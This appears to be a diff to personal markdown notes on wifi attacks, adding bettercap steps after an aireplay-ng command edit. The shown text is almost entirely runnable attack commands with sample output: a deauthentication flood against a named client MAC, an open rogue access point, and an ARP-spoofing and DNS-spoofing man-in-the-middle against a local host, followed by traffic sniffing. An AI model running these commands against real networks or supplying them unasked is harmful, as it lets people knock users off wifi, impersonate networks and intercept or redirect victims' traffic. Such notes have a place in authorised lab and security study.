@@ -84,7 +84,7 @@ sudo aireplay-ng --test wlo1mon
 sudo airodump-ng --channel 2 wlo1mon
 
 # Deauthenticate target device from wifi by sending deauth packets
-sudo aireplay-ng --deauth 100 -a [BSSID] -c [Client_MAC] wlan0mon
+sudo aireplay-ng --deauth 100 -a [BSSID] -c [Client_MAC] wlo1mon
 # E.g
 sudo aireplay-ng --deauth 100 -a CC:71:90:62:9E:98 -c F2:2A:23:9E:54:E2 wlo1mon
 # E.g output
@@ -110,4 +110,39 @@ sudo systemctl restart NetworkManager
 sudo apt update
 sudo apt install bettercap
 
+
+# Rogue access point
+sudo bettercap -iface wlo1mon
+
+# In bettercap:
+set wifi.ap.ssid Banana
+set wifi.ap.bssid DE:AD:BE:EF:DE:AD
+set wifi.ap.channel 5
+set wifi.ap.encryption false
+wifi.recon on; wifi.ap
+
+
+# Fake dns
+sudo bettercap -iface wlo1
+
+# In bettercap:
+net.probe on
+net.show
+
+set arp.spoof.targets 192.168.1.9
+set dns.spoof.domains alo1411.team
+
+arp.spoof on
+# E.g output
+[sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets
+
+dns.spoof on
+# E.g output
+[sys.log] [inf] dns.spoof alo1411.team -> 192.168.1.17
+
+net.sniff
 ```
+
+## References
+
+- Bettercap: [WiFi](https://www.bettercap.org/modules/wifi/)
